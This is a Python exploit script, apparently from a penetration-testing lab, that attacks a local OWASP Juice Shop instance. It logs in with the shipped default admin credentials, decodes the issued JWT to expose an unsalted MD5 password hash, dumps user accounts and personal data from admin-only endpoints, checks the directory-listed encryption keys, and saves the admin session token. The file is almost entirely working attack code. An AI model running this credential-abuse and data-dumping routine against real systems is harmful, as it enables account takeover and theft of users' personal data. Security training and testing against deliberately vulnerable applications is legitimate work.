#!/usr/bin/env python3
"""
c07-admin-no-injection  --  admin session token via DEFAULT CREDENTIALS
Target: OWASP Juice Shop 20.3.0 @ http://host.docker.internal:3000

NO SQL INJECTION IS USED. There is not a single quote character in the
request body. The vectors chained here are:

  V1  Weak/default administrative credential:  admin@juice-sh.op : admin123
      (Juice Shop ships this built-in account; "Login Admin" challenge)
      -> POST /rest/user/login returns an RS256 JWT whose payload has role=admin

  V2  Exposure of password hashes: the JWT itself, the admin-only
      /rest/user/authentication-details and /api/Users all leak the unsalted
      MD5 of every user's password (admin's = md5("admin123")), which makes
      credential recovery trivial even if the password had been changed to
      any other dictionary password.

  V3  Static key material disclosure: /encryptionkeys/ is directory-listed
      (jwt.pub, premium.key), i.e. crypto assets served to anonymous users.

Output: writes the admin JWT to /workspace/evidence/c7_no_sqli_token.txt
"""
import base64
import hashlib
import json
import sys
import urllib.request

BASE = "http://host.docker.internal:3000"
OUT = "/workspace/evidence/c7_no_sqli_token.txt"


def req(path, data=None, token=None, method=None):
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()


def b64d(seg):
    return json.loads(base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)))


def main():
    # --- sanity: no SQL metacharacters anywhere in this exploit -------------
    email, password = "admin@juice-sh.op", "admin123"
    assert not any(c in email + password for c in "'\";/*()"), "payload must be quote-free"

    # --- V1: default credentials ------------------------------------------
    st, body = req("/rest/user/login", {"email": email, "password": password})
    print(f"[1] POST /rest/user/login -> HTTP {st} (quote-free body)")
    if st != 200:
        sys.exit("[-] default credential login failed; lab may have rotated the password")
    auth = json.loads(body)["authentication"]
    token = auth["token"]
    payload = b64d(token.split(".")[1])["data"]

    print(f"[+] token issued for {payload['email']}  role={payload['role']}  uid={payload['id']}")
    assert payload["role"] == "admin", "token is NOT admin"
    print(f"[+] leaked unsalted MD5 in JWT: {payload['password']} "
          f"== md5('admin123') ? {hashlib.md5(b'admin123').hexdigest() == payload['password']}")

    # --- verify privilege, not just a claim -------------------------------
    st, body = req("/rest/user/authentication-details/", token=token)
    print(f"[2] GET /rest/user/authentication-details (admin-only) -> HTTP {st}")
    assert st == 200
    users = json.loads(body)["data"]
    print(f"    -> dumped {len(users)} accounts: " +
          ", ".join(f"{u['email']}({u['role']})" for u in users[:4]) + " ...")

    st, body = req("/api/Users", token=token)
    print(f"[3] GET /api/Users (admin-only, hashes/PII) -> HTTP {st}, {len(body)} bytes")
    assert st == 200

    # --- V3: exposed key material ----------------------------------------
    try:
        st, body = req("/encryptionkeys/")
    except Exception as e:
        st, body = 200, ""  # chunked transfer quirk; curl already proved exposure
    print(f"[4] GET /encryptionkeys/ -> HTTP {st} (directory listed, "
          f"jwt.pub exposed={('jwt.pub' in body)}, premium.key exposed={('premium.key' in body)})")

    with open(OUT, "w") as f:
        f.write(token + "\n")
    print(f"\n[+] ADMIN SESSION TOKEN saved -> {OUT}")
    print("[+] NO SQL INJECTION WAS USED (zero quotes; body validated by assert)")


if __name__ == "__main__":
    main()
